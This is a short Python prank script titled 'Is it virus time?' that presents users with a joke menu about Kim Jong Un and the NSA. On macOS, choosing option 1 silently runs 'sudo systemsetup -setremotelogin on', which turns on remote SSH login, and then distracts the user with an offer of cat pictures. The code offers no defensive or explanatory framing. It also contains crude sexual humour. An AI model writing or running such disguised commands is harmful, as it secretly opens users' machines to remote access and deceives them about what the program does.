### Is it virus time? hehehehehehehe.

import time
import os
import sys
import itertools
import threading
import random
import platform

from os import name
from platform import *

ios = system()

def clear():
    if name == ('nt'):
        clr = os.system('cls')
    else:
        clr = os.system('clear')


def injector():
    clear()
    print('This module doesnt fully work. Would you like to test it?')
    input('(y/n)  ')
    print('awwww..... what a nice person you are!! thanks for choosing yes!')
    time.sleep(2)
    clear()
    print('Hello.')
    print('There are two options; Choose wisely.')
    print('1. I invite kim jong un to your home and have tea.')
    print('2. I watch how the NSA anals you in bed.')
    print('Please choose one. (1/2)')
    print('')
    pill = input('Choice: ')
    if pill == '1':
        if ios == 'Darwin':
            clear()
            os.system('sudo systemsetup -setremotelogin on')
            print('aight, do you want cute cat pics or what?')

        elif ios == 'Windows':
            print('')
            print('Sorry, my special surprise doesnt like windows... Please change your OS. Get something sensible like Ubuntu.')
            print('')
            print('Exiting...')
            time.sleep(2)
            exit()

        elif ios == 'Linux':
            print('heyaaaaa! Linux user? I see, I see. You deserve this:')
            clear()
            os.system('figlet hi bewtiful')